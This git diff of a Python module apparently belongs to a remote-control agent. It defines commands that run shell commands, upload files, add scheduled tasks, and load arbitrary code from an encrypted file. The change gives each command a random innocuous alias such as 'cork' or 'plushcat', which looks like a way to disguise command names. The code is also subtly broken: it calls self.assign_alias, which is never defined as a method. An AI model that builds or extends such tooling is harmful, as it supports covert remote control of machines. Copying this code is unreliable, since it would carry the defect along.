@@ -1,4 +1,5 @@
 import json
+import random
 from typing import Dict
 from models.encrypted_file import EncryptedFile
 from models.scheduale_task import SchedualerTask
@@ -6,12 +7,20 @@ import os
 from models.command import Command
 
 
+def assign_alias(aliases):
+    choice = random.choice(aliases)
+    aliases.remove(choice)
+    return choice
+
+
 class Commands:
     def __init__(self):
-        self.commands: Dict[str, Command] = {'cmd': RunInCMD(), 'upload': UploadFile(),
-                                             'schedule': AddToScheduler()}
+        self.aliases = ["cork", "craftbook", "hairribbon", "bottleofsunscreen", "hairtie", "spectacles", "speakers",
+                        "handbag", "sidewalk", "plushcat", "stickofincense", "tweezers", "whistle", "quilt", "slipper"]
+        self.commands: Dict[str, Command] = {'cmd': RunInCMD(self.assign_alias(self.aliases)), 'upload': UploadFile(self.assign_alias(self.aliases)),
+                                             'schedule': AddToScheduler(self.assign_alias(self.aliases))}
         self.add_command = AddCommand(
-            self.commands, {'name': '', 'from_file': 'False', 'code': ''}, 'file.txt')
+            self.commands, {'name': '', 'from_file': 'False', 'code': ''}, 'file.txt', self.assign_alias(self.aliases), self.aliases)
         try:
             self.add_command.add_from_file()
         except Exception:
@@ -26,7 +35,8 @@ class Commands:
 
     def get_command(self, name):
         try:
-            params = {'params': self.commands[name].params, 'name': name}
+            params = {'params': self.commands[name].params,
+                      'name': name, 'alias': self.commands[name].alias}
         except KeyError:
             params = {}
         return params
@@ -38,10 +48,11 @@ class Commands:
 
 
 class AddCommand(Command):
-    def __init__(self, commands: Dict, params, save_file):
-        super().__init__()
+    def __init__(self, commands: Dict, params, save_file, alias, left_aliases):
+        super().__init__(alias)
         self.commands = commands
         self.params = params
+        self.aliases = left_aliases
         self.enc_file = EncryptedFile(save_file, 'mass')
 
     def add_from_file(self):
@@ -59,7 +70,8 @@ class AddCommand(Command):
         if from_file.lower() == 'true':
             with open(code) as f:
                 code = f.read()
-        self.commands[params['name']] = Command({}, code)
+        self.commands[params['name']] = Command(
+            assign_alias(self.aliases), {}, code)
 
     def execute(self):
         self.add_command(self.params)
@@ -67,7 +79,8 @@ class AddCommand(Command):
 
 
 class RunInCMD(Command):
-    def __init__(self) -> None:
+    def __init__(self, alias) -> None:
+        self.alias = alias
         self.params = {'command': ''}
 
     def execute(self):
@@ -77,7 +90,8 @@ class RunInCMD(Command):
 
 
 class UploadFile(Command):
-    def __init__(self) -> None:
+    def __init__(self, alias) -> None:
+        self.alias = alias
         self.params = {'path': '', 'content': ''}
 
     def execute(self):
@@ -86,7 +100,8 @@ class UploadFile(Command):
 
 
 class AddToScheduler(Command):
-    def __init__(self) -> None:
+    def __init__(self, alias) -> None:
+        self.alias = alias
         self.params = {'name': '', 'arg': ''}
 
     def execute(self):
